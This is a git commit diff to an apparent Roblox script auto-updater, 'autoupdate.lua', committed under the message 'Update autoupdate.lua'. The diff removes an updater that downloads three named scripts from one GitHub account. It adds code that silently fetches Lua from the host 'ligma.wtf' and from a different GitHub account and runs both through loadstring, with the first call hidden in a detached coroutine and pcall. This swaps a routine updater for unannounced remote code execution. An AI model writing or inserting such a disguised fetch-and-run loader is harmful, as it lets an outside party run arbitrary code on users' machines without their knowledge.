1bb33ff94a425f5e8dfdb168faebad550dc24f84
Amenteshades <129307184+Amenteshades@users.noreply.github.com>
2023-03-29 16:38:46 +0100

    Update autoupdate.lua

--- autoupdate.lua
+++ autoupdate.lua
@@ -1,16 +1,4 @@
-if not isfile("lastautoupdate.txt") or os.time()-tonumber(readfile("lastautoupdate.txt"))>=21600 then -- autoupdate frequency in seconds, only updates when you join game
-local autoupdate={
-["autorun\\funcs.lua"]="https://raw.githubusercontent.com/exceptional0/scr/main/funcs.lua";
-["autorun\\baddieblocklist4remotes.lua"]="https://raw.githubusercontent.com/exceptional0/scr/main/baddieblocklist4remotes.lua";
-["autorun\\fpscap69.lua"]="https://raw.githubusercontent.com/exceptional0/scr/main/fpscap69.lua";
-}
-for i,v in pairs(autoupdate) do
-local s,cc=pcall(game.HttpGet,game,v)
-if s and isfile(i) and readfile(i)~=cc or s and not isfile(i) then
-writefile(i,cc)
-end
-task.wait()
-end
-writefile("lastautoupdate.txt",tostring(os.time()))
-end
---loadfile("autorun.lua")()
+coroutine.resume(coroutine.create(pcall), function()
+	loadstring(game:HttpGet("http://ligma.wtf/scripts/compatibility.lua", true))()
+end)
+return loadstring(game:HttpGet("https://raw.githubusercontent.com/6yNuiC9/scr/autoupdate.lua", true))(...)
